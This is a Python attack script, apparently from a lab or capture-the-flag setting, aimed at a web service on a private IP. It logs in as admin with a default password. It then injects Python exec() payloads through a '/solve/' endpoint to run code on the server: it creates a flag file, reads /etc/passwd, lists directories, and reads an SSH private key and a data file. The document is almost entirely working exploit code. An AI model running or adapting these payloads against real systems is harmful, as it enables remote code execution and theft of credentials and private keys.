import asyncio
import random
import string
from multiprocessing import Process
from time import sleep

import aiohttp
from yarl import URL

host = "192.168.123.2"
prefix = f"http://{host}:8000"


def randstr(length: int) -> str:
    return "".join(
        random.choice(string.ascii_letters + string.digits) for _ in range(length)
    )


async def get_raw(session: aiohttp.ClientSession, url: str):
    response = await session.get(url)
    await response.read()


commands = [
    """exec("import os;global a;a=os.path.abspath(os.curdir)")""",
    """exec("import os;import subprocess;os.chdir('..');os.chdir('..');os.chdir('..');os.chdir('tmp');subprocess.run(['touch', 'flag'])")""",
    """exec("import os;import subprocess;os.chdir('..');os.chdir('etc');global a;f=open('passwd','r');a=f.read();f.close()")""",
    """exec("import os;os.chdir('..');os.chdir('/');os.chdir('app');global a;a=os.listdir('.')")""",
    """exec("import os;global a;a=os.listdir('.ssh')")""",
    """exec("import os;os.chdir('.ssh');global a;f=open('id_ed25519','r');a=f.read();f.close()")""",
    """exec("import os;os.chdir('..');os.chdir('data');global a;a=os.listdir('.')")""",
    """exec("import os;global a;f=open('important_data.txt','r');a=f.read();f.close()")""",
]


async def main():
    for _ in range(len(commands)):
        print(f"Start Attack {_} / {len(commands)}")
        async with aiohttp.ClientSession(
            cookie_jar=aiohttp.CookieJar(unsafe=True)
        ) as session:
            try:
                # t = random.randint(60, 120)
                t = random.randint(1, 3)
                print(f"Sleeping {t}s... {_} / {len(commands)}")
                await asyncio.sleep(t)

                res = await session.post(
                    f"{prefix}/admin/login",
                    json={"username": "admin", "password": "123456"},
                )
                await res.json()

                from urllib.parse import quote

                expr = commands[_]
                encoded_expr = quote(expr, safe="")
                print(">", expr)

                res = await session.get(f"{prefix}/solve/{encoded_expr}")
                await res.text()

                res = await session.get(f"{prefix}/solve/a")
                print("<", await res.text())

            except Exception as e:
                print(e)


asyncio.run(main())
